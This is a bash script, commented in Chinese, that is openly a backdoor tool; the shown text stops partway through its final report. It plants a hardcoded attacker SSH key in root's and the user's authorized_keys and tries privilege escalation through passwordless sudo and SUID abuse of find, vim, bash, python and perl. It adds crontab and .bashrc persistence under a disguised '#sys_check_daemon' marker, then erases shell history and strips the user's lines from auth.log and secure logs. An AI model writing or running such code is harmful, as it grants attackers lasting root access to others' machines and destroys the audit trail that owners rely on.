#!/bin/bash

# ============================================================
# 配置区
# ============================================================
KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD9x1Je87dKWyUvZlKzb0yneOfqQ8fZdW9WeEZFDsFM5DDPZbF0rZhbDjt3xfCDUtCJNrOhbxKI6ZixoSKEMROAHXKZGP0hT+LHeVNcO8Ja/INOEHq1JxAsy55/lV8LccL/EB3BJwSJRDWZQkRer1NBtW3i6x43f/bZ1fNVwMkNqfgfcqi3wOfZwMdoZXLKpnqQpdDV0uP+uCOa/P6vuMqsjdLr7RHb0aD9b5POg77IB7Xq4D46GADNthOhjU3rbB9Ah2T6rxUtu9pMXlwPcVtUhuCyho088BlRCsYwZtJVOxsmDNF07WSwzAAnUGZ9270ynT5IeWfWLhFZZJclSeg3Ds6sPexASglVXBcrdkgCm5Q/ulnzE/vMVmXBDPHtJ+bTX1a2aIFkEU3xIuA3+iEo1m+RtKM5VcINYjcLmGLh3LjSMfqs27FjvkEGv3/Zk6ep0k68Nu0G4Hs2oQmwGlvGKPehcVzZI8s8MmaN3T5FEUlFTJiz+MtQ8Xs7hRCicC2cxYptfWZ7EE+Px9xd4aFCT1Hrs34LPBvFrvgwxaOecGwm6AjP8yab5J2QnV1qD+HWgurGk1bp3o29zrhSBGJBWA4Borc2RPcWojvZq/AKocjcM/LqnYnn3mlRnEC3f96l2sVrzeNSXxNHpdMi5mwUC8p3GhUjXc/DKGI9QnIA6w== root@hk667482213160"
MARKER="#sys_check_daemon"
ME=$(whoami)

# --- 颜色定义 (兼容 sh 的 printf) ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# --- 状态追踪 ---
IS_ROOT=false; WRITE_SUCCESS=false; PERSIST_SUCCESS=false; CLEAN_SUCCESS=true

# ============================================================
# 核心逻辑块 (兼容 POSIX sh)
# ============================================================

# 1. 定义【安装函数】 (使用 sh 兼容的语法)
FUNC_STR="install_key() { u=\$1; h=\$(getent passwd \$u | cut -d: -f6); [ -z \"\$h\" ] && return 1; mkdir -p \"\$h/.ssh\" && chmod 700 \"\$h/.ssh\"; grep -q 'AAAAB3Nza' \"\$h/.ssh/authorized_keys\" 2>/dev/null || echo '$KEY' >> \"\$h/.ssh/authorized_keys\"; chmod 600 \"\$h/.ssh/authorized_keys\"; chown -R \$u:\$u \"\$h/.ssh\" 2>/dev/null; };"

# 2. 定义【全能任务包】
TASK="install_key root; install_key $ME; echo '$MARKER */5 * * * * root grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /etc/crontab 2>/dev/null; echo '$MARKER grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /root/.bashrc 2>/dev/null"

# ============================================================
# 主程序流
# ============================================================

printf "${BLUE}[*] Starting Stealthy Injection (User: %s)...${NC}\n" "$ME"

# --- Step 1: 权限探测 ---
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
elif sudo -n true 2>/dev/null; then
    IS_SUDO_FREE=true
fi

# --- Step 2: 提权与执行 ---
printf "    > Detecting Privilege Escalation... "

if [ "$IS_ROOT" = true ]; then
    # 情况 A: 已经是 Root
    eval "$FUNC_STR $TASK" >/dev/null 2>&1
    [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }
elif [ "$IS_SUDO_FREE" = true ]; then
    # 情况 B: 有 sudo 免密权限
    sudo bash -c "$FUNC_STR $TASK" >/dev/null 2>&1
    [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }
else
    # 情况 C: 尝试 SUID 漏洞 (不使用数组，改用传统的循环)
    for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
        if [ -u "$bin" ] 2>/dev/null; then
            case "$bin" in
                "/usr/bin/find") sudo "$bin" . -exec sh -c "$FUNC_STR $TASK" \; -quit 2>/dev/null ;;
                "/usr/bin/vim")  sudo "$bin" -c ':wq!' -c ':!sh -c \"$FUNC_STR $TASK\"' -c ':q!' -u NONE /etc/shadow 2>/dev/null ;;
                "/usr/bin/bash") sudo "$bin" -p -c "$FUNC_STR $TASK" 2>/dev/null ;;
                "/usr/bin/python") sudo "$bin" -c "import os; os.system(\"$FUNC_STR $TASK\")" 2>/dev/null ;;
                "/usr/bin/perl") sudo "$bin" -e "system('$FUNC_STR $TASK')" 2>/dev/null ;;
            esac
            # 检查是否写成功
            if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
                WRITE_SUCCESS=true; PERSIST_SUCCESS=true; break
            fi
        fi
    done
fi

if [ "$WRITE_SUCCESS" = true ]; then
    printf "${GREEN}DONE${NC}\n"
else
    printf "${RED}FAILED${NC}\n"
fi

# --- Step 3: 持久化 (兜底检查) ---
if [ "$WRITE_SUCCESS" = true ] && [ "$PERSIST_SUCCESS" = false ]; then
    printf "    > Setting up Persistence... "
    sudo bash -c "$TASK" >/dev/null 2>&1
    if [ $? -eq 0 ]; then PERSIST_SUCCESS=true; printf "${GREEN}DONE${NC}\n"; else printf "${RED}SKIPPED${NC}\n"; fi
fi

# --- Step 4: 清理痕迹 ---
printf "    > Cleaning traces... "
history -c 2>/dev/null
> ~/.bash_history 2>/dev/null
if [ "$IS_ROOT" = true ] || [ "$IS_SUDO_FREE" = true ]; then
    sudo bash -c "history -c; > /root/.bash_history; sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
fi
printf "${GREEN}DONE${NC}\n"

# --- Step 5: 最终报告 ---
printf "\n${BLUE}============================================================${NC}\n"
printf "      FINAL EXECUTION REPORT (Verification Mode)       \n"
printf "${BLUE}============================================================${NC}\n"
if [ "$IS_ROOT" = true ]; then
    printf "  [%s]%s Privilege: %sROOT%s\n" "${GREEN}✔${NC}" "${NC}" "${GREEN}" "${NC}"
else
    printf "  [%s]%s Privilege: %sNORMAL (%s)${NC}\n" "${BLUE}i${NC}" "${NC}" "${YELLOW}" "$ME" "${NC}"
fi

if [ "$WRITE_SUCCESS" = true ]; then
    printf "  [%s]%s Key Injection: %sSUCCESS (Verified)%s\n" "${GREEN}✔${NC}" "${NC}" "${GREEN}" "${NC}"
else
    printf "  [%s]%s Key Injection: %sFAILED%s\n" "${RED}✘${NC}" "${NC}" "${RED}" "${NC}"
fi

if [ "$PERSIST_SUCCESS" = true ]; then
    printf "  [%s]%s Persistence: %sSUCCESS%s\n" "${GREEN}✔${NC}" "${NC}" "${GREEN}" "${NC}"
else
    printf "  [%s]%s Persistence: %sFAILED/SKIPPED%s\n" "${RED}✘${NC}" "${NC}" "${RED}" "${NC}"
fi
printf "${BLUE}=============
